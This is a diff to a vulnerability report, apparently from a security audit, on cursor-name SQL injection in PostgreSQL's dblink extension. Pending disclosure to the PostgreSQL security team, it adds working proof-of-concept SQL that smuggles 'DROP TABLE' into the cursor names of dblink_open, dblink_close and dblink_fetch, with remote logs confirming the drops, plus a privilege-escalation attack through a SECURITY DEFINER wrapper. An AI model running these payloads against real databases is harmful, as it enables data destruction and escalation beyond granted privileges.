@@ -251,22 +251,140 @@ If confirmed, email **security@postgresql.org**:
 ## Status
 
 - **Persisted in kuzushi findings**: see `/tmp/targets/pg-fdw/.kuzushi/v2/findings.sqlite3`
-- **PoC verification**: NOT YET DONE — desk audit only
-- **Email**: NOT sent — pending PoC verification
+- **PoC verification**: ✅ **VERIFIED** on PostgreSQL 16.13 with two local clusters
+  (ports 55432 + 55433, dblink installed from packaged shared library).
+  See `## Live verification` below.
+- **Email**: NOT yet sent — operator decision
 - **Patch**: drafted above, NOT upstreamed
 - **Affected versions**: Likely all supported (dblink_open/close/fetch
   signatures unchanged for decades). PG 13–17 + master at time of writing.
+  Verified on PG 16.13.
 
-## Caveat
+## Live verification (2026-05-12)
 
-This is a desk-audit finding. The mechanic is unambiguous (regex
-match + verified call-chain via Thread D + multi-statement protocol
-confirmed) but **a live PoC on a real two-instance postgres setup is
-necessary before claiming CVE-worthiness publicly**. There's a
-non-zero chance the postgres team will respond "dblink is by-design
-caller-trusted, use `quote_ident` yourself" — that would land it as a
-hardening commit rather than a CVE.
+Two local clusters on Postgres 16.13 (Ubuntu packaged), local=55432,
+remote=55433. dblink installed on local with default permissions.
 
-If it IS a CVE: this is meme-worthy. Headline: "PostgreSQL dblink:
-20+ years of identifier injection in cursor names." Affects every
-contrib install with dblink + user-mapped remote servers.
+### Site 1 — `dblink_close` (cleanest, single-statement exploit)
+
+```sql
+-- Setup on remote
+CREATE TABLE secret(id int);
+INSERT INTO secret VALUES (1),(2),(3);
+
+-- On local, as postgres superuser
+SELECT dblink_connect('myconn',
+    'host=/tmp/pg-test port=55433 user=postgres dbname=postgres');
+SELECT dblink_open('myconn', 'normalcursor', 'SELECT 1');
+SELECT dblink_close('myconn', 'normalcursor; DROP TABLE secret; --', false);
+```
+
+Remote postgres log:
+```
+LOG:  statement: BEGIN
+LOG:  statement: DECLARE normalcursor CURSOR FOR SELECT 1
+LOG:  statement: CLOSE normalcursor; DROP TABLE secret; --
+LOG:  statement: COMMIT
+```
+
+`\dt secret` → **"Did not find any relation named 'secret'."** ✅
+
+The implicit COMMIT happens because `dblink_close` decrements the
+cursor count to 0 and auto-commits the transaction. The injected
+`DROP TABLE` persists.
+
+### Site 2 — `dblink_open` (requires follow-up `dblink_close` to commit)
+
+```sql
+CREATE TABLE sec_o();
+SELECT dblink_connect('co', '...');
+SELECT dblink_open('co', 'malicious CURSOR FOR SELECT 1; DROP TABLE sec_o; --',
+                   'SELECT 999');
+SELECT dblink_close('co', 'malicious');   -- commits the transaction
+```
+
+Remote log:
+```
+DECLARE malicious CURSOR FOR SELECT 1; DROP TABLE sec_o; -- CURSOR FOR SELECT 999
+CLOSE malicious
+COMMIT
+```
+
+`\dt sec_o` → **"Did not find any relation."** ✅
+
+### Site 3 — `dblink_fetch` (requires follow-up `dblink_close` to commit)
+
+```sql
+CREATE TABLE sec_f();
+SELECT dblink_connect('cf', '...');
+SELECT dblink_open('cf', 'inj_cur', 'SELECT 1');
+SELECT * FROM dblink_fetch('cf', 'inj_cur; DROP TABLE sec_f; --', 1)
+  AS t(x int);
+SELECT dblink_close('cf', 'inj_cur');     -- commits
+```
+
+Remote log:
+```
+DECLARE inj_cur CURSOR FOR SELECT 1
+FETCH 1 FROM inj_cur; DROP TABLE sec_f; --
+CLOSE inj_cur
+COMMIT
+```
+
+`\dt sec_f` → **"Did not find any relation."** ✅
+
+### Privilege-escalation PoC (the real attack shape)
+
+Setup:
+- Local: superuser `postgres` + non-superuser `attacker` (no privileges
+  on remote `admin_data`).
+- Remote: `admin_data` table owned by `postgres`, with
+  `REVOKE ALL ON admin_data FROM PUBLIC`.
+- Local admin (`postgres`) creates a SECURITY DEFINER wrapper:
+  ```sql
+  CREATE OR REPLACE FUNCTION app_open_remote_cursor(cur_name text)
+  RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
+  BEGIN
+      PERFORM dblink_connect_u('app_pipe',
+          'host=127.0.0.1 port=55433 user=postgres dbname=postgres');
+      RETURN dblink_open('app_pipe', cur_name, 'SELECT 1 AS x');
+  END $$;
+
+  CREATE OR REPLACE FUNCTION app_close_remote_cursor(cur_name text)
+  RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
+  BEGIN RETURN dblink_close('app_pipe', cur_name); END $$;
+
+  GRANT EXECUTE ON FUNCTION app_open_remote_cursor(text)  TO attacker;
+  GRANT EXECUTE ON FUNCTION app_close_remote_cursor(text) TO attacker;
+  ```
+
+  This is the **realistic application pattern** the patch defends:
+  an app exposes a wrapper that lets users open/close named remote
+  cursors via a privileged pipe, intending to delegate cursor
+  management only, not arbitrary SQL.
+
+Attack (as `attacker`, non-superuser, no privileges on `admin_data`):
+```sql
+SELECT app_open_remote_cursor('benign');
+SELECT app_close_remote_cursor('benign; DROP TABLE admin_data; --');
+```
+
+Result: `admin_data` is DROPPED on remote, owned by `postgres`,
+which `attacker` had ZERO privileges on. **Full privilege
+escalation** from `attacker` to remote `postgres`. ✅
+
+The `attacker`'s OWN direct dblink_connect-as-attacker session
+could not have done this — they had no SELECT/INSERT/DROP on
+`admin_data`. The SECURITY DEFINER wrapper provided the privileged
+identity; the cursor-name injection provided the arbitrary-SQL
+capability.
+
+## Headline if accepted as a CVE
+
+> "PostgreSQL dblink: 20+ years of identifier injection in cursor
+> names. Any SECURITY DEFINER wrapper around dblink_open/close/fetch
+> gives non-superusers arbitrary SQL on the remote server with the
+> wrapper's identity."
+
+3-line patch reusing the helper that's been in the same file the
+whole time.
